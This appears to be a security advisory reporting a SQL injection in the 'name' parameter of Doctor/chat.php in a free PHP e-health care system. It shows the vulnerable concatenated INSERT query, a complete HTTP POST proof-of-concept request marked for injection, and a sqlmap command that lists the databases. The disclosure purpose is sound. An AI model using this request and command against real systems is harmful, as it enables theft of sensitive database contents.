# E-Health Care System IN PHP has sql injection vulnerability via name parameter in chat.php.

## supplier
https://code-projects.org/e-health-care-system-in-php-css-js-and-mysql-free-download/
## Vulnerability file
Doctor/chat.php and name parameters
## describe
There are unrestricted SQL injection attacks in the E-Health Care System. Controllable parameters: name .

In chat.php.php, there are no filter parameters, and there is no restriction on the execution of concatenated SQL statements, resulting in SQL injection vulnerabilities. You can obtain sensitive information from the database

## code analysis
The $name parameters of the chat.php are not filtered and concatenated into the SQL statement for execution when attacker is not logining.

![image-20241104132441881](https://github.com/user-attachments/assets/ba8c4e50-7184-4c42-999e-441734fe7b88)

```
  <?php
	if (isset($_POST['submit'])) {
	$name = $_POST['name'];
	$message = $_POST['message'];
		$query ="INSERT INTO chat ( name , message) values ('$name' , '$message')";
		$run =$db->query($query);
		if($run){
		echo" <embed loop='false' src='chat.wav' hidden= 'true' autoplay='true' />";
		}
	}
	?>
```

## POC

```
POST /Doctor/chat.php HTTP/1.1
Host: healthcare
Content-Length: 36
Cache-Control: max-age=0
Origin: http://healthcare
DNT: 1
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://healthcare/Doctor/chat.php
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Connection: close

name=1*&message=1&submit=Send+Message
```

save it as 1.txt

```
python sqlmap.py -r 1.txt --level 3 --risk 2 --dbs
```

Get the database_name: healthcare， and get all dbs.

![image-20241104132619664](https://github.com/user-attachments/assets/cc0243b0-f6d2-402e-b999-c485b9492ca1)

![image-20241103231338743](https://github.com/user-attachments/assets/c5c14b93-cdd7-47be-b65f-913e1ba78f5e)